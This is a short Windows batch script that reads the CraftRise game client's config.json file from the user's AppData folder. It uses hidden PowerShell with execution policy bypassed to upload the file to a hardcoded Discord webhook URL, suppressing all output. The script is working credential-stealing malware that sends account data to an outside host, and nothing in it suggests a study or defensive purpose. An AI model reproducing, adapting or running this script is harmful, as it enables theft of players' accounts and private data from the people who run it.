@echo off
setlocal EnableDelayedExpansion

set "WEBHOOK=https://discordapp.com/api/webhooks/1469687998869405951/DURtiUe_9DHXWHy6AUGRN54iHoif5ixmh9kJSu9hdkbrmOqPo1AJ1F0w9zNs2DBrio_U"
set "CONFIG_FILE=%APPDATA%\.craftrise\config.json"

if not exist "%CONFIG_FILE%" exit /b

powershell -NoProfile -ExecutionPolicy Bypass -Command ^
    "$b = [guid]::NewGuid().ToString(); " ^
    "$c = Get-Content '%CONFIG_FILE%' -Raw -Encoding UTF8; " ^
    "$body = '--'+$b+'`r`nContent-Disposition: form-data; name=""file""; filename=""config.json""`r`nContent-Type: application/json`r`n`r`n'+$c+'`r`n--'+$b+'--'; " ^
    "Invoke-RestMethod -Uri '%WEBHOOK%' -Method Post -ContentType 'multipart/form-data; boundary='+$b -Body $body -TimeoutSec 30" >nul 2>&1

exit
